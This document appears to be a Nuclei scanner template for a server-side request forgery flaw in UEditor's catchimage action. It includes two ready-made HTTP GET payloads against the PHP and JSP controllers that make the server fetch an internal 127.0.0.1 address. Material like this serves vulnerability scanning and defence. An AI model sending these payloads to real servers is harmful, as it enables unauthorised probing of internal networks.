# Nuclei Template: UEditor - Server Side Request Forgery
**Template ID:** ueditor-ssrf
**Vulnerability Class:** Resource Injection
**Severity:** Medium
**CWE:** CWE-99
**Source:** Nuclei Template (`ueditor-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
UEditor contains an Server Side Request Forgery vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png
GET {{BaseURL}}/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png
```

## References
- https://xz.aliyun.com/t/4154
- https://www.seebug.org/vuldb/ssvid-97311
